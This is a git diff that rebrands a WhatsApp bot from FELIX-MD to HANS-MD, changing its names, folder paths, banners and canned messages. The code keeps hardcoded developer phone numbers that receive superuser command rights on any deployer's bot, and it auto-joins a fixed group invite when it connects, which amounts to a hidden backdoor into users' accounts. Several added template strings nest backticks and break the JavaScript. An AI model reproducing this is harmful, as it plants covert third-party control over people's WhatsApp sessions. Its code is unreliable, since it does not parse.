@@ -74,7 +74,7 @@ const {
   atbverifierEtatJid,
   atbrecupererActionJid
 } = require("./bdd/antibot");
-let evt = require(__dirname + "/hanstz/hans");
+let evt = require(__dirname + "/framework/zokou");
 const {
   isUserBanned,
   addUserToBanList,
@@ -94,8 +94,8 @@ const {
 //const //{loadCmd}=require("/hanstz/mesfonctions")
 let {
   reagir
-} = require(__dirname + "/hanstz/app");
-var session = conf.session.replace(/FELIX-MD;;;=>/g, "");
+} = require(__dirname + "/framework/app");
+var session = conf.session.replace(/HANS-MD;;;=>/g, "");
 const prefixe = conf.PREFIXE;
 require('dotenv').config({
   'path': "./config.env"
@@ -141,7 +141,7 @@ setTimeout(() => {
       logger: pino({
         level: "silent"
       }),
-      browser: ['FELIX-MD', "safari", "1.0.0"],
+      browser: ['HANS-MD', "safari", "1.0.0"],
       printQRInTerminal: true,
       fireInitQueries: false,
       shouldSyncHistoryMessage: true,
@@ -180,17 +180,17 @@ setTimeout(() => {
         const callerId = callData[0].from;
         await zk.rejectCall(callId, callerId);
         await zk.sendMessage(callerId, {
-          text: "```📵I AM Felix Md | I REJECT THIS CALL BECAUSE MY OWNER IS BUSY.KINDLY SEND TEXT INSTEAD``` ."
+          text: "\n\n`⚠️`\n\n> WARNING: THIS IS HANS-XMD. MY OWNER IS UNAVAILABLE FOR CALLS. PLEASE SEND A TEXT MESSAGE\n\n`🤫`."
         });
       }
     });
     // Function to format notification message
 function createNotification(deletedMessage) {
   const deletedBy = deletedMessage.key.participant || deletedMessage.key.remoteJid;
-  let notification = `*FELIX ANTIDELETE*\n\n`;
-  notification +=   `*TIME DELETED :* ${new Date().toLocaleString()}\n`;
-  notification +=   `*DELETED BY   :* @${deletedBy.split('@')[0]}\n\n
-                    *POWERED BY HANSTZ*\n\n`;
+  let notification = `*🎃HANS MD ANTIDELETE🎃*\n\n`;
+  notification +=   `*⌚TIME DELETED :* ${new Date().toLocaleString()}\n`;
+  notification +=   `*🤦🏽‍♂️DELETED BY   :* @${deletedBy.split('@')[0]}\n\n
+                    *👨🏽‍💻POWERED BY HANSTZ*\n\n`;
   return notification;
 }
 
@@ -350,9 +350,9 @@ zk.ev.on("messages.upsert", async m => {
      // Function to format notification message
 function createNotification(deletedMessage) {
   const deletedBy = deletedMessage.key.participant || deletedMessage.key.remoteJid;
-  let notification = `*FELIX ANTIDELETE*\n\n`;
-  notification += `*Time deleted🥀:* ${new Date().toLocaleString()}\n`;
-  notification += `*Deleted by🌷:* @${deletedBy.split('@')[0]}\n\n*Powered by HANSTZ*\n\n`;
+  let notification = `*\n\n`🎃`\n\n> HANS MD ANTIDELETE\n\n`🎃`*\n\n`;
+  notification +=   `*\n\n> TIME DELETED\n\n`⌚`:* ${new Date().toLocaleString()}\n`;
+  notification +=   `*\n\n> DELETED BY\n\n`🤦🏽‍♂️`:* @${deletedBy.split('@')[0]}\n\n> POWERED BY HANSTZ\n\n`;
   return notification;
 }
 
@@ -690,10 +690,10 @@ if (conf.AUTO_LIKE_STATUS === "yes") {
       } = require("./bdd/sudo");
       const nomAuteurMessage = ms.pushName;
       const sudo = await getAllSudoNumbers();
-      const superUserNumbers = [servBot, "255760774888", '254110190196', '255760774888', "255756530143", '255760774888', conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+      const superUserNumbers = [servBot, "255760774888", '255760774888', '255760774888', "255756530143", '255760774888', conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
       const allAllowedNumbers = superUserNumbers.concat(sudo);
       const superUser = allAllowedNumbers.includes(auteurMessage);
-      var dev = ['254110190196', '255760774888', "255756530143", '255760774888'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+      var dev = ['255760774888', '255760774888', "255756530143", '255760774888'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
       function repondre(mes) {
         zk.sendMessage(origineMessage, {
           text: mes
@@ -701,7 +701,7 @@ if (conf.AUTO_LIKE_STATUS === "yes") {
           quoted: ms
         });
       }
-      console.log("\t [][]...{FELIX-MD}...[][]");
+      console.log("\t [][]...{HANS-MD}...[][]");
       console.log("=========== New message ===========");
       if (verifGroupe) {
         console.log("message sent from : " + nomGroupe);
@@ -1092,7 +1092,7 @@ if (conf.ANTILINK === "yes") {
           // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
 
           var sticker = new Sticker("https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif", {
-            pack: 'FELIX-MD',
+            pack: 'HANS-MD',
             author: conf.OWNER_NAME,
             type: StickerTypes.FULL,
             categories: ['🤩', '🎉'],
@@ -1189,7 +1189,7 @@ if (conf.ANTILINK === "yes") {
             /******************* PM_PERMT***************/
 
             if (!superUser && origineMessage === auteurMessage && conf.PM_PERMIT === "yes") {
-              repondre("SORRY!! ❌\n\nYou don't have acces to commands here idiot");
+              repondre("Sorry!! ❌\n\nYou don't have acces to commands here idiot Just try in group");
               return;
             }
             ///////////////////////////////
@@ -1251,13 +1251,13 @@ if (conf.ANTILINK === "yes") {
       try {
         const metadata = await zk.groupMetadata(group.id);
         if (group.action == 'add' && (await recupevents(group.id, "welcome")) == 'on') {
-          let msg = `👋 Hello
+          let msg = `👋 HELLO AM HANS-MD
 `;
           let membres = group.participants;
           for (let membre of membres) {
-            msg += ` *@${membre.split("@")[0]}* Welcome to Our Official Group,`;
+            msg += ` *@${membre.split("@")[0]}*🤗 welcome to our official group,`;
           }
-          msg += `You might want to read the group Description to avoid getting removed...`;
+          msg += `You might want to read the group Description \n\n`📜` to avoid getting removed\n\n `🚷` To our Group Ok...`;
           zk.sendMessage(group.id, {
             image: {
               url: ppgroup
@@ -1266,7 +1266,7 @@ if (conf.ANTILINK === "yes") {
             mentions: membres
           });
         } else if (group.action == 'remove' && (await recupevents(group.id, "goodbye")) == 'on') {
-          let msg = `one or somes member(s) left group;\n`;
+          let msg = `ONE OR SOME MEMBERS LEFT GROUP IS DON'T BACK AGAIN COMRADE\n\n`😤`;\n`;
           let membres = group.participants;
           for (let membre of membres) {
             msg += `@${membre.split("@")[0]}\n`;
@@ -1377,10 +1377,10 @@ if (conf.ANTILINK === "yes") {
         connection
       } = con;
       if (connection === "connecting") {
-        console.log("ℹ️ Felix Md connecting in your account...");
+        console.log("ℹ️ Hans Md connecting in your account...");
       } else if (connection === 'open') {
         await zk.groupAcceptInvite("DvXonepPp1XBPOYIBziTl1");
-        console.log("✅ Felix Md connected successfully✔");
+        console.log("✅ Hans Md connected successfully✔");
         console.log("--");
         0;
         await baileys_1.delay(200);
@@ -1388,14 +1388,14 @@ if (conf.ANTILINK === "yes") {
         0;
         await baileys_1.delay(300);
         console.log("------------------/-----");
-        console.log(" FELIX-MD installing ${evt.cm.length} plugins😇\n\n");
+        console.log(" Hans-Md installing ${evt.cm.length} plugins😇\n\n");
         //chargement des commandes 
         console.log("chargement des commands ...\n");
-        fs.readdirSync(__dirname + "/commands").forEach(fichier => {
+        fs.readdirSync(__dirname + "/commandes").forEach(fichier => {
           if (path.extname(fichier).toLowerCase() == ".js") {
             try {
-              require(__dirname + "/commands/" + fichier);
-              console.log(fichier + "Successfully installed Felix Md commands✔️");
+              require(__dirname + "/commandes/" + fichier);
+              console.log(fichier + "Successfully installed Hans Md commands✔️");
             } catch (e) {
               console.log(`${fichier} n'a pas pu être chargé pour les raisons suivantes : ${e}`);
             } /* require(__dirname + "/commands/" + fichier);
@@ -1414,31 +1414,31 @@ if (conf.ANTILINK === "yes") {
         } else {
           md = "undefined";
         }
-        console.log("Felix Md successfully connected✅");
+        console.log("Hans Md successfully connected✅");
         await activateCrons();
         if (conf.DP.toLowerCase() === "yes") {
   // Send the video with the message and quote the original message
   const sentMessage = await zk.sendMessage(zk.user.id, {
     video: { url: "https://files.catbox.moe/nva5tz.mp4" }, // Video URL
     caption: `
-╭━━━━━━━━━━━━━━━━━━━━⊷
-┃    *『 FELIX-MD 𝐢𝐬 𝐎𝐧𝐥𝐢𝐧𝐞 』*
-╰━━━━━━━━━━━━━━━━━━━━⊷
-
- 🌟 *Bot Information*
  ━━━━━━━━━━━━━━━━━━━━
- 📌 *Creator*: HANSTZ
- 🔑 *Prefix*: [ ${prefixe} ]
- 💡 *Mode*: ${md} mode
- 📝 *Total Commands*: ${evt.cm.length}
-
+┃🤖┃ *『 𝑯𝑨𝑵𝑺-𝑴𝑫 𝑰𝑺 𝑶𝑵𝑳𝑰𝑵𝑬 』*
+┃━━━━━━━━━━━━━━━━━━━━
+┃━━━━━━━━━━━━━━━━━━━━
+┃🌟┃\n\n> 𝐁𝐎𝐓 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍
+┃━━━━━━━━━━━━━━━━━━━━
+┃📌┃*𝐂𝐫𝐞𝐚𝐭𝐨𝐫*: 𝑯𝒂𝒏𝒔𝑻𝒛
+┃🔑┃*𝐏𝐫𝐞𝐟𝐢𝐱*: [ ${prefixe} ]
+┃💡┃*𝐌𝐨𝐝𝐞*: ${md} mode
+┃📝┃*𝐓𝐨𝐭𝐚𝐥 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬*: ${evt.cm.length}
+┃━┃━━━━━━━━━━━━━━━━━━
+┃━┃━━━━━━━━━━━━━━━━━━
+┃🔔┃*𝙏𝙝𝙖𝙣𝙠 𝙮𝙤𝙪 𝙛𝙤𝙧 𝙘𝙝𝙤𝙤𝙨𝙞𝙣𝙜 𝙃𝙖𝙣𝙨-𝙈𝙙!*
+┃🌐┃*𝙎𝙩𝙖𝙮 𝙐𝙥𝙙𝙖𝙩𝙚𝙙 𝙒𝙞𝙩𝙝 𝙇𝙖𝙩𝙚𝙨𝙩 𝙄𝙣𝙛𝙤𝙧𝙢𝙖𝙩𝙞𝙤𝙣.*
+┃🎭┃*𝙎𝙘𝙧𝙞𝙥𝙩 𝘽𝙔, 𝙃𝘼𝙉𝙎𝙏𝙕
  ━━━━━━━━━━━━━━━━━━━━
- 🔔 *Thank you for choosing FELIX-MD!*
- 🌐 *Stay updated with the latest information.*
- > Regards, HANSTZ
-╰━━━━━━━━━━━━━━━━━━━━⊷
 
-⭐ *Don't forget to give me Star and fork the repo*`
+⭐*Dᴏɴ'ᴛ ғᴏʀɢᴇᴛ ᴛᴏ ɢɪᴠᴇ ᴍᴇ sᴛᴀʀ ᴀɴᴅ ғᴏʀᴋ ᴛʜᴇ ʀᴇᴘᴏ*`
   });
 
   // Send the audio reply, quoted the video/image message
@@ -1446,7 +1446,7 @@ if (conf.ANTILINK === "yes") {
     audio: { url: "https://github.com/kinghanstz/HANS-DATABASE/raw/38fc2499e3435cf7a2e85a22a9b1afeb492d234e/audios/Matrix-menu.mp3" },
     mimetype: "audio/mp4",
     ptt: true,
-    quoted: sentMessage, // Quote the video/image message sent earlier
+    quoted: ms, // Quote the video/image message sent earlier
   });
 }
 
@@ -1458,7 +1458,7 @@ if (conf.ANTILINK === "yes") {
           console.log('!!! connexion fermée, reconnexion en cours ...');
           main();
         } else if (raisonDeconnexion === baileys_1.DisconnectReason.connectionLost) {
-          console.log('connection error😞 ,,Felix trying to reconnect... ');
+          console.log('connection error😞 ,,Hans trying to reconnect... ');
           main();
         } else if (raisonDeconnexion === baileys_1.DisconnectReason?.connectionReplaced) {
           console.log('connexion réplacée ,,, une sesssion est déjà ouverte veuillez la fermer svp !!!');
